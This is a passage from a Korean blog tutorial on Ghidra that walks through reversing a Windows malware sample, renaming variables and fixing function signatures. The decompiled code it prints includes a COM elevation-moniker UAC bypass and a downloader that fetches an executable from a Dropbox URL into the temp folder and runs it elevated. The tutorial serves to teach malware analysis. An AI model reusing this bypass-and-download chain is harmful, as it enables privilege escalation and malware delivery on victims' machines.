undefined local_3c [<span class="hljs-number">16</span>];  FARPROC local_2c;  FARPROC local_28;  FARPROC local_24;  <span class="hljs-keyword">int</span> local_20;  FARPROC local_1c;  HMODULE local_18;  <span class="hljs-keyword">int</span> local_14;  <span class="hljs-keyword">int</span> local_10;    local_10 = <span class="hljs-number">0x80004005</span>;  local_14 = <span class="hljs-number">0</span>;  local_50 = (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>;  local_18 = LoadLibraryA(<span class="hljs-string">&quot;ole32.dll&quot;</span>);  local_1c = GetProcAddress(local_18,<span class="hljs-string">&quot;CoInitializeEx&quot;</span>);  ppiVar4 = (<span class="hljs-keyword">int</span> **)<span class="hljs-number">0x6</span>;  puVar3 = (undefined *)<span class="hljs-number">0x0</span>;  local_20 = (*local_1c)(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>);  pHVar1 = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  local_24 = GetProcAddress(pHVar1,<span class="hljs-string">&quot;CLSIDFromString&quot;</span>);  pHVar1 = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  local_28 = GetProcAddress(pHVar1,<span class="hljs-string">&quot;IIDFromString&quot;</span>);  <span class="hljs-keyword">do</span> {    iVar2 = (*local_24)(<span class="hljs-string">L&quot;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}&quot;</span>,local_4c,puVar3,ppiVar4);    <span class="hljs-keyword">if</span> ((iVar2 != <span class="hljs-number">0</span>) ||       (iVar2 = (*local_28)(<span class="hljs-string">L&quot;{6EDD6D74-C007-4E75-B76A-E5740995E24C}&quot;</span>,local_3c), iVar2 != <span class="hljs-number">0</span>)) <span class="hljs-keyword">break</span>;    FUN_0040f860((undefined *)local_27c,<span class="hljs-number">0x208</span>);    wcscpy(local_27c,<span class="hljs-string">L&quot;Elevation:Administrator!new:&quot;</span>);    wcscat(local_27c,<span class="hljs-string">L&quot;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}&quot;</span>);    FUN_0040f860((undefined *)local_74,<span class="hljs-number">0x24</span>);    local_74[<span class="hljs-number">0</span>] = <span class="hljs-number">0x24</span>;    local_60 = <span class="hljs-number">4</span>;    pHVar1 = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);    local_2c = GetProcAddress(pHVar1,<span class="hljs-string">&quot;CoGetObject&quot;</span>);    ppiVar4 = &amp;local_50;    puVar3 = local_3c;    local_10 = (*local_2c)(local_27c,local_74);    FUN_00401a0f();    local_10 = (**(code **)(*local_50 + <span class="hljs-number">0x24</span>))(local_50,DAT_00416028,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);  } <span class="hljs-keyword">while</span> (local_14 != <span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_50 != (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>) {    (**(code **)(*local_50 + <span class="hljs-number">8</span>))(local_50);  }  <span class="hljs-keyword">return</span>;}</code></pre><p><code>GetProcAddress</code>&#xB85C; &#xD568;&#xC218;&#xB4E4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC838;&#xC640;&#xC11C;&#x2026; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xC2E4;&#xD589;&#xC744; &#xD558;&#xB294;&#xB370; &#xBB50;&#xAC00; &#xBB34;&#xC5C7;&#xC744; &#xD558;&#xB294;&#xC9C0;  &#xB208;&#xC5D0; &#xD655;&#xC778;&#xD558;&#xAE30;&#xAC00; &#xC5B4;&#xB835;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F4; &#xB54C;&#xB294; Rename Variable (L)&#xACFC; Retype Variable (Ctrl + L)&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD55C;&#xB208;&#xC5D0; &#xBCF4;&#xAE30; &#xC27D;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218;&#xB3C4; &#xC788;&#xACE0;, &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xB294; &#xAC12;&#xB4E4;&#xC758; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;&#xB3C4; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xB9DE;&#xCDB0; &#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%205.png" alt></p><p><code>local_18</code>&#xACFC; <code>local_1c</code>&#xC758; &#xC774;&#xB984;&#xC744; &#xBCC0;&#xACBD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. <code>FARPROC</code>&#xC73C;&#xB85C; &#xB418;&#xC5B4;&#xC788;&#xB294; <code>CoInitializeEx_addr</code>&#xC740; <code>CoInitializeEx</code>&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xC73C;&#xB2C8;, &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;&#xC744; <code>CoInitializeEx *</code>&#xB85C; &#xBC14;&#xAFB8;&#xC5B4;&#xBCFC;&#xAE4C;&#xC694;?</p><p><code>CoInitializeEx_addr</code>&#xC5D0; &#xB9C8;&#xC6B0;&#xC2A4; &#xCEE4;&#xC11C;&#xB97C; &#xC62C;&#xB9AC;&#xACE0; &#xC6B0;&#xD074;&#xB9AD; &#xD6C4; Retype Variable &#xD639;&#xC740; Ctrl + L&#xC744; &#xB204;&#xB974;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xCC3D;&#xC774; &#xB739;&#xB2C8;&#xB2E4;. &#xAC70;&#xAE30;&#xC5D0; &#xC801;&#xD600;&#xC788;&#xB294; <code>FARPROC</code>&#xC744; &#xC9C0;&#xC6B0;&#xACE0; <code>CoInitializeEx *</code>&#xB97C; &#xC791;&#xC131;&#xD55C; &#xD6C4; OK!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%206.png" alt></p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%207.png" alt></p><p>&#xADF8;&#xB7FC; &#xC704;&#xC640; &#xAC19;&#xC774; &#xD568;&#xC218; &#xD0C0;&#xC785;&#xC744; &#xC124;&#xC815;&#xD558;&#xB294; &#xCC3D;&#xC774; &#xB739;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xAC00; &#xC0AC;&#xC6A9;&#xD560; &#xD568;&#xC218;&#xAC00; &#xB9DE;&#xC73C;&#xB2C8;&#xAE4C; OK &#xBC84;&#xD2BC;&#xC744; &#xB20C;&#xB7EC;&#xC8FC;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xBC14;&#xB01D;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%208.png" alt></p><p>&#xD55C;&#xB208;&#xC5D0; &#xBCF4;&#xAE30; &#xD6E8;&#xC52C; &#xD3B8;&#xD574;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xB978; &#xBD80;&#xBD84;&#xB3C4; &#xC704;&#xC640; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; Rename, Retype&#xC744; &#xC9C4;&#xD589;&#xD55C; &#xD6C4; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xB2E4;&#xB978; &#xD568;&#xC218;&#xB4E4;&#xC774; &#xC5B4;&#xB5A0;&#xD55C; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p>&#xBA3C;&#xC800; <code>FUN_0040f860</code>&#xB97C; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_0040f860</span><span class="hljs-params">(undefined *param_1,<span class="hljs-keyword">int</span> param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  undefined *puVar1;    puVar1 = param_1 + param_2;  <span class="hljs-keyword">if</span> (param_2 != <span class="hljs-number">0</span>) {    <span class="hljs-keyword">do</span> {      *param_1 = <span class="hljs-number">0</span>;      param_1 = param_1 + <span class="hljs-number">1</span>;    } <span class="hljs-keyword">while</span> (puVar1 != param_1);  }  <span class="hljs-keyword">return</span>;}</code></pre><p>&#xD3EC;&#xC778;&#xD130;&#xB97C; &#xBC1B;&#xC544;&#xC11C; <code>param2</code>&#xB9CC;&#xD07C; 0&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; <code>RtlSecureMemory()</code>&#xC640; &#xB9E4;&#xC6B0; &#xD761;&#xC0AC;&#xD558;&#xC8E0;.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __CRT__NO_INLINE 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function">PVOID WINAPI <span class="hljs-title">RtlSecureZeroMemory</span><span class="hljs-params">(PVOID ptr,SIZE_T cnt)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">char</span> *vptr = (<span class="hljs-keyword">volatile</span> <span class="hljs-keyword">char</span> *)ptr;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __x86_64</span>  __stosb ((PBYTE)((DWORD64)vptr),<span class="hljs-number">0</span>,cnt);<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>  <span class="hljs-keyword">while</span> (cnt != <span class="hljs-number">0</span>)    {      *vptr++ = <span class="hljs-number">0</span>;      cnt--;    }<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">/* __x86_64 */</span></span>  <span class="hljs-keyword">return</span> ptr;</code></pre><p>&#xCD9C;&#xCC98; : <a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-crt/intrincs/RtlSecureZeroMemory.c">https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-crt/intrincs/RtlSecureZeroMemory.c</a></p><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xC774;&#xB984;&#xC744; <code>RtlSecureMemory</code>&#xB85C; &#xD558;&#xACE0; Function Signature&#xB97C; &#xC218;&#xC815;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD568;&#xC218; &#xC774;&#xB984;&#xC5D0; &#xCEE4;&#xC11C;&#xB97C; &#xC62C;&#xB9B0; &#xD6C4; &#xC6B0;&#xD074;&#xB9AD; - Edit Function Signature&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xC5EC; &#xC704;&#xC758; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC5D0; &#xB098;&#xC628; Signature&#xC640; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xC218;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%209.png" alt></p><p>&#xADF8;&#xB9AC;&#xACE0; OK&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xBA74;</p><pre><code class="hljs c"><span class="hljs-function">PVOID <span class="hljs-title">RtlSecureMemory</span><span class="hljs-params">(PVOID param_1,SIZE_T param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  undefined *puVar1;    puVar1 = (undefined *)((<span class="hljs-keyword">int</span>)param_1 + param_2);  <span class="hljs-keyword">if</span> (param_2 != <span class="hljs-number">0</span>) {    <span class="hljs-keyword">do</span> {      *(undefined *)param_1 = <span class="hljs-number">0</span>;      param_1 = (PVOID)((<span class="hljs-keyword">int</span>)param_1 + <span class="hljs-number">1</span>);    } <span class="hljs-keyword">while</span> (puVar1 != (undefined *)param_1);  }  <span class="hljs-keyword">return</span>;}</code></pre><p>&#xAE54;&#xB054;&#xD558;&#xAC8C;(?) &#xBC14;&#xB010; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2010.png" alt></p><p>&#xD558;&#xD558;&#xD558; &#xAD1C;&#xCC2E;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xB2E4;&#xC74C; &#xD568;&#xC218;&#xC778; <code>FUN_00401a0f</code>&#xAC00; &#xC5B4;&#xB5A0;&#xD55C; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2011.png" alt></p><p>&#xC55E;&#xBD80;&#xBD84;&#xC744; &#xC77D;&#xC5B4;&#xBCF4;&#xB2C8; &#xC778;&#xD130;&#xB137;&#xC5D0; &#xC5F0;&#xACB0;&#xC744; &#xD574;&#xC11C; &#xD574;&#xB2F9; URL&#xC5D0;&#xC11C; ATAPIConfiguration&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xB294; &#xD568;&#xC218;&#xC784;&#xC744; &#xC9D0;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xD568;&#xC218;&#xBA85;&#xC744; <code>download_ATAPIConfiguration</code>&#xC774;&#xB77C;&#xACE0; &#xD569;&#xC2DC;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xC758; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xB3D9;&#xC791; &#xAE30;&#xB2A5;&#xC744; &#xC815;&#xB9AC;&#xD574;&#xBCF4;&#xBA74;</p><ol><li><a href="https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512">COM &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; UAC&#xB97C; &#xC6B0;&#xD68C;</a></li><li>&#xC778;&#xD130;&#xB137;&#xC5D0;&#xC11C; ATAPIConfiguration&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;</li></ol><p>&#xADF8;&#xB7FC; &#xD574;&#xB2F9; &#xD568;&#xC218; &#xC774;&#xB984;&#xC740; uac_bypass_and_download_file&#xB85C; &#xD558;&#xC5EC; &#xC815;&#xB9AC;&#xB97C; &#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xCF54;&#xB4DC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">uac_bypass_download_file</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  HMODULE HModule;  HRESULT HVar1;  <span class="hljs-keyword">wchar_t</span> <span class="hljs-built_in">string</span> [<span class="hljs-number">260</span>];  BIND_OPTS pBindOptions;  undefined4 local_60;  <span class="hljs-keyword">int</span> *ppv;  CLSID local_4c;  IID riid;  CoGetObject *CoGetObject_addr;  IIDFromString *IIDFromString_addr;  CLSIDFromString *CLSIDFromString_addr;  HRESULT local_20;  CoInitializeEx *CoInitializeEx_addr;  HMODULE hModule;  <span class="hljs-keyword">int</span> local_14;  HRESULT local_10;    local_10 = <span class="hljs-number">0x80004005</span>;  local_14 = <span class="hljs-number">0</span>;  ppv = (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>;  hModule = LoadLibraryA(<span class="hljs-string">&quot;ole32.dll&quot;</span>);  CoInitializeEx_addr = (CoInitializeEx *)GetProcAddress(hModule,<span class="hljs-string">&quot;CoInitializeEx&quot;</span>);  local_20 = (*CoInitializeEx_addr)((LPVOID)<span class="hljs-number">0x0</span>,<span class="hljs-number">6</span>);  HModule = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  CLSIDFromString_addr = (CLSIDFromString *)GetProcAddress(HModule,<span class="hljs-string">&quot;CLSIDFromString&quot;</span>);  HModule = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  IIDFromString_addr = (IIDFromString *)GetProcAddress(HModule,<span class="hljs-string">&quot;IIDFromString&quot;</span>);  <span class="hljs-keyword">do</span> {    HVar1 = (*CLSIDFromString_addr)(<span class="hljs-string">L&quot;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}&quot;</span>,(LPCLSID)&amp;local_4c);    <span class="hljs-keyword">if</span> ((HVar1 != <span class="hljs-number">0</span>) ||       (HVar1 = (*IIDFromString_addr)(<span class="hljs-string">L&quot;{6EDD6D74-C007-4E75-B76A-E5740995E24C}&quot;</span>,(LPIID)&amp;riid),       HVar1 != <span class="hljs-number">0</span>)) <span class="hljs-keyword">break</span>;    RtlSecureZeroMemory(<span class="hljs-built_in">string</span>,<span class="hljs-number">0x208</span>);    wcscpy(<span class="hljs-built_in">string</span>,<span class="hljs-string">L&quot;Elevation:Administrator!new:&quot;</span>);    wcscat(<span class="hljs-built_in">string</span>,<span class="hljs-string">L&quot;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}&quot;</span>);    RtlSecureZeroMemory(&amp;pBindOptions,<span class="hljs-number">0x24</span>);    pBindOptions.cbStruct = <span class="hljs-number">0x24</span>;    local_60 = <span class="hljs-number">4</span>;    HModule = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);    CoGetObject_addr = (CoGetObject *)GetProcAddress(HModule,<span class="hljs-string">&quot;CoGetObject&quot;</span>);    local_10 = (*CoGetObject_addr)(<span class="hljs-built_in">string</span>,&amp;pBindOptions,&amp;riid,&amp;ppv);    download_ATAPIConfiguration();    local_10 = (**(code **)(*ppv + <span class="hljs-number">0x24</span>))(ppv,download_path,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);  } <span class="hljs-keyword">while</span> (local_14 != <span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (ppv != (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>) {    (**(code **)(*ppv + <span class="hljs-number">8</span>))(ppv);  }  <span class="hljs-keyword">return</span>;}</code></pre><h2 id="ATAPIConfiguration-&#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;-&#xD568;&#xC218;"><a href="#ATAPIConfiguration-&#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;-&#xD568;&#xC218;" class="headerlink" title="ATAPIConfiguration &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xD568;&#xC218;"></a>ATAPIConfiguration &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xD568;&#xC218;</h2><p>&#xC774;&#xC81C; &#xC544;&#xAE4C; &#xC9C0;&#xB098;&#xCCE4;&#xB358; <code>download_ATAPIConfiguration()</code>&#xC744; &#xBD84;&#xC11D;&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">undefined4 <span class="hljs-title">download_ATAPIConfiguration</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  <span class="hljs-keyword">char</span> cVar1;  <span class="hljs-keyword">bool</span> bVar2;  undefined4 uVar3;  HMODULE pHVar4;  <span class="hljs-keyword">int</span> iVar5;  <span class="hljs-keyword">size_t</span> sVar6;  undefined4 *puVar7;  uint uVar8;  LPCSTR pCVar9;  <span class="hljs-keyword">int</span> local_64;  undefined4 local_60;  undefined4 local_5c;  uint local_58;  FARPROC local_54;  FARPROC local_50;  FARPROC local_4c;  HANDLE local_48;  FARPROC local_44;  <span class="hljs-keyword">char</span> *local_40;  <span class="hljs-keyword">void</span> *local_3c;  <span class="hljs-keyword">int</span> local_38;  FARPROC local_34;  FARPROC local_30;  FARPROC local_2c;  <span class="hljs-keyword">int</span> local_28;  FARPROC local_24;  <span class="hljs-keyword">int</span> local_20;  FARPROC local_1c;  <span class="hljs-keyword">int</span> local_18;  FARPROC local_14;  HMODULE local_10;    local_10 = LoadLibraryA(<span class="hljs-string">&quot;wininet.dll&quot;</span>);  local_14 = GetProcAddress(local_10,<span class="hljs-string">&quot;InternetOpenW&quot;</span>);  local_18 = (*local_14)(<span class="hljs-string">L&quot;WINDOWS&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_18 == <span class="hljs-number">0</span>) {    uVar3 = <span class="hljs-number">0xe</span>;  }  <span class="hljs-keyword">else</span> {    pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);    local_1c = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);    local_20 = (*local_1c)(local_18,<span class="hljs-string">L&quot;dl.dropboxusercontent.com&quot;</span>,<span class="hljs-number">0x1bb</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (local_20 == <span class="hljs-number">0</span>) {      uVar3 = <span class="hljs-number">0xe</span>;    }    <span class="hljs-keyword">else</span> {      pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);      local_24 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);      local_28 = (*local_24)(local_20,&amp;DAT_00413270,<span class="hljs-string">L&quot;/s/uzu60whrg1spnyy/ATAPIConfiguration&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,                             <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);      <span class="hljs-keyword">if</span> (local_28 == <span class="hljs-number">0</span>) {        uVar3 = <span class="hljs-number">0xe</span>;      }      <span class="hljs-keyword">else</span> {        local_5c = <span class="hljs-number">4</span>;        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        local_2c = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetQueryOptionW&quot;</span>);        iVar5 = (*local_2c)(local_28,<span class="hljs-number">0x1f</span>,&amp;local_58,&amp;local_5c);        <span class="hljs-keyword">if</span> (iVar5 != <span class="hljs-number">0</span>) {          pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          local_30 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetSetOptionW&quot;</span>);          local_58 = local_58 | <span class="hljs-number">0x1180</span>;          (*local_30)(local_28,<span class="hljs-number">0x1f</span>,&amp;local_58,<span class="hljs-number">4</span>);        }        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        local_34 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;HttpSendRequestA&quot;</span>);        local_38 = (*local_34)(local_28,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);        local_3c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(local_3c,<span class="hljs-number">0</span>,<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(DAT_00416028,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>);        local_40 = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);        sVar6 = <span class="hljs-built_in">strlen</span>(local_40);        DAT_0041602c = (LPCSTR)<span class="hljs-built_in">malloc</span>(sVar6 + <span class="hljs-number">0x1000</span>);        <span class="hljs-built_in">strcpy</span>(DAT_0041602c,local_40);        uVar8 = <span class="hljs-number">0xffffffff</span>;        pCVar9 = DAT_0041602c;        <span class="hljs-keyword">do</span> {          <span class="hljs-keyword">if</span> (uVar8 == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;          uVar8 = uVar8 - <span class="hljs-number">1</span>;          cVar1 = *pCVar9;          pCVar9 = pCVar9 + <span class="hljs-number">1</span>;        } <span class="hljs-keyword">while</span> (cVar1 != <span class="hljs-string">&apos;\0&apos;</span>);        puVar7 = (undefined4 *)(DAT_0041602c + (~uVar8 - <span class="hljs-number">1</span>));        *puVar7 = <span class="hljs-number">0x4154415c</span>;        puVar7[<span class="hljs-number">1</span>] = <span class="hljs-number">0x6f434950</span>;        puVar7[<span class="hljs-number">2</span>] = <span class="hljs-number">0x6769666e</span>;        puVar7[<span class="hljs-number">3</span>] = <span class="hljs-number">0x74617275</span>;        puVar7[<span class="hljs-number">4</span>] = <span class="hljs-number">0x2e6e6f69</span>;        puVar7[<span class="hljs-number">5</span>] = <span class="hljs-number">0x657865</span>;        MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_0041602c,<span class="hljs-number">-1</span>,DAT_00416028,<span class="hljs-number">0x1000</span>);        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        local_44 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;CreateFileW&quot;</span>);        local_48 = (HANDLE)(*local_44)(DAT_00416028,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0</span>);        local_60 = <span class="hljs-number">0</span>;        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        local_4c = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        local_50 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;WriteFile&quot;</span>);        <span class="hljs-keyword">if</span> (local_38 == <span class="hljs-number">0</span>) {          uVar3 = <span class="hljs-number">0xe</span>;        }        <span class="hljs-keyword">else</span> {          local_64 = <span class="hljs-number">0</span>;          <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) {            iVar5 = (*local_4c)(local_28,local_3c,<span class="hljs-number">0x2000</span>,&amp;local_64);            <span class="hljs-keyword">if</span> ((iVar5 == <span class="hljs-number">0</span>) || (local_64 == <span class="hljs-number">0</span>)) {              bVar2 = <span class="hljs-literal">false</span>;            }            <span class="hljs-keyword">else</span> {              bVar2 = <span class="hljs-literal">true</span>;            }            <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;            (*local_50)(local_48,local_3c,local_64,&amp;local_60,<span class="hljs-number">0</span>);          }          pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          local_54 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetCloseHandle&quot;</span>);          CloseHandle(local_48);          (*local_54)(local_18);          (*local_54)(local_20);          (*local_54)(local_28);          uVar3 = <span class="hljs-number">1</span>;        }      }    }  }  <span class="hljs-keyword">return</span> uVar3;}</code></pre><p>&#xC774; &#xCE5C;&#xAD6C;&#xB3C4; &#xC0C1;&#xB2F9;&#xD788; &#xC9C0;&#xC800;&#xBD84;&#xD558;&#xB124;&#xC694;. &#xC815;&#xB9AC;&#xAC00; &#xD544;&#xC694;&#xD560; &#xB4EF;&#xD569;&#xB2C8;&#xB2E4;. &#xC544;&#xAE4C; &#xC0AC;&#xC6A9;&#xD55C; &#xBC29;&#xBC95;&#xCC98;&#xB7FC; &#xBA3C;&#xC800; Handle&#xACFC; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB4E4;&#xC744; &#xC815;&#xB9AC;&#xD574;&#xC90D;&#xC2DC;&#xB2E4;!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2012.png" alt></p><p>&#xD558;&#xC9C0;&#xB9CC;&#x2026; <code>InternetOpenW</code>&#xC758; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;&#xC774; &#xC5C6;&#xB2E4;&#xACE0; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. &#xD760;&#x2026; &#xBB50;&#xAC00; &#xBB38;&#xC81C;&#xC77C;&#xAE4C;? Data Type Manager&#xC5D0;&#xC11C; &#xCC3E;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;. <code>InternetOpenW()</code>&#xB294; <code>wininet.h</code>&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD568;&#xC218;&#xC774;&#xB2C8; <code>wininet.h</code>&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xC744; &#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2013.png" alt></p><p>&#xC5C6;&#xB124;&#xC694;&#x2026; &#xADF8;&#xB7FC; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xAC78;&#xAE4C;&#xC694;? MSDN&#xC744; &#xBCF4;&#xACE0; &#xC190;&#xC218; &#xC791;&#xC131;&#xC744; &#xD574;&#xC57C; &#xD558;&#xB294; &#xAC74;&#xAC00;? &#xC9C1;&#xC811; &#xD5E4;&#xB354; 